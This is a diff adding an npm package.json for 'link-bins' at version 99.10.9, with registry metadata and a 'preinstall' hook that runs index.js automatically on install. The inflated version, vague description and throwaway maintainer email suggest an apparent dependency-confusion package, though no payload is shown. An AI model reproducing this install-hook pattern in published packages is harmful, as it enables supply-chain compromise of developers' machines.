@@ -1,0 +1,39 @@
+{
+    "name": "link-bins",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "link-bins@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-lxjPzW51rA33ktYk/iEMmYr7Y2j7ZCG1L5qKTzW5Y9bv7b3KWHxca1VrhmvF08uNb1xMPZJjfqZHsMlhqiwbWw==",
+        "shasum": "536d78f7e9fdc2f0e1f305f9c098f2270c8e1901",
+        "tarball": "https://registry.npmjs.org/link-bins/-/link-bins-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5061,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMVNACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoBHg//YLEP1GVXqVN3Eorn3Q5q/pW0QyHFOWD5gESB2mqPKCMBqxP5\r\n5fe8v/KOV1iEuFApimgaHBKzJwVv+JgyD2VSftRjcLoNm4rUuSVYY4Cbn2We\r\nx+8/5BryYSyLQzKGl+PJewtRd9vW25HvvVe9O/5lzlbE9/iTAAnds2msi4fk\r\nBDwF1fZYlK3qgayCaebhYN2rxOqeAMSxrUvZ9CSfC+41cvtFLWw+K0C3Q6/Q\r\nVjL3AVDrJkipcJ+w5jP9y4fSTQuwEy8ZTrmHvqKc16OB/Obf/an160V7Hr9W\r\ny7ubrFcn+/XARy3PCcXy5g9j+vki1ZmJAf4Demf1/S/NF2HJ8WvgJzx3m81d\r\nuqpVVRmcPYGL6TuOpXqRWoDwa0j95MkFiP0v93prvBDaq9BEA78/NLCmMncR\r\nFJiSRVjjKklVXm/8Ndhh47TtJqJmsLwY7WgkmK7PCgkmmm5XNq8fwah5jM5z\r\nFO/wzicCHwCBt2NBcJhIRydY/oBciuWwrAixHGnBoDhrFv/TUDlGhW7XyNn2\r\n5T/PTqEa+BYoodHfwkE1cV7AIGyHkZ33DJn26FBFHis9w1EWYHM9JlDG0Yhj\r\ngG37zAUPIH5UtxNv6kzEMORatMNTvOIz9B9WZ6Lc+prpM2i/8ol7fJv4+5tz\r\nYESMd2inFppWnlQLS6pXcwVBeelZsRJsWqg=\r\n=tIjV\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "yoanqhbt",
+        "email": "yoanqhbt@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "yoanqhbt",
+            "email": "yoanqhbt@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/link-bins_99.10.9_1648149837360_0.8601121734996335"
+    },
+    "_hasShrinkwrap": false
+}
